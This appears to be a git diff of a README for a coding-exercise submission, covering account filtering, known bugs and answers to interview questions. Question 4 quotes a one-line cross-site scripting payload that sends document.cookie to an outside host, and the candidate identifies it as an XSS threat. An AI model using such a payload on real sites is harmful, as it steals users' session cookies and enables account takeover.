@@ -95,10 +95,20 @@ I’ve completed 3 out of the 4 enhancements.
             that the application is fully functioning as it should and can easily me modified if any issues do come up.
 
     * ***Add searching/filtering functionality to the accounts***,
-        * the list view have filter by methods for name, email, birthday and balance
+        * I’ve added two filtering features. You can filter by column (name, email, birthday, balance) or there’s a
+        search bar that can search based on the account name. Further implementation is needed to search across other
+        attributes besides name.
+
+* Area of Improvements:
+    * When creating a new account. We don’t check to see if a additional account with that name or email exists.
+    We should add additional logic in to handle this case.
+    * When creating a new user, if you don’t pick any of the month/date/year dropdown values it defaults to 12-31-1899.
+    This should be fixed with some kind of default or requirements of the birthday value.
+    *
 
 * Assumptions:
-    * name and email are required, birthday is not, balance does not?
+    * Account consists of name, birthday and email. As well as wallet balance which is part of the Full Service implementation.
+    * Use a database of your choice.
 
 * Completion Time:
     * 4 hrs to setup endpoint call, display users in list view and stubbed new, edit and delete onClick events.
@@ -122,11 +132,17 @@ I’ve completed 3 out of the 4 enhancements.
 
 ## Question 4:
 * Question: What harm could result from the following? `http://www.example.com/search?q=<script>object.src="http://otherexample.com/code?data="+document.cookie</script>`
-* Answer:
+* Answer: This could be vulnerable to HTTP parameter pollution if the parameters aren’t being sanitized properly. This also looks like it would be vulnerable to cross-side
+scripting XSS attacking. Where the attacker could manipulate cookie data.
 
 ## Question 5:
 * Question: Explain what security measures need to be taken into consideration for web applications.
-* Answer:
+* Answer: This can be broken down into several areas. But here’s a few important ones to note. Use HTTPS everywhere
+    * Secure user specific requests with Authorization Headers, JWT (JSON Web Token)
+    * Use secure HTTP response headers from your web service.
+    * Use Parameterized SQL queries within the application
+    * Strong validation on the source input on client as well as server-side. (When applicable)
+    * Implement a strong password process / policy (e.g letters, numbers, symbols)
 
 ## Question 6:
 * Question: Please provide us with a link(s) to your portfolio and/or some code samples of your work.
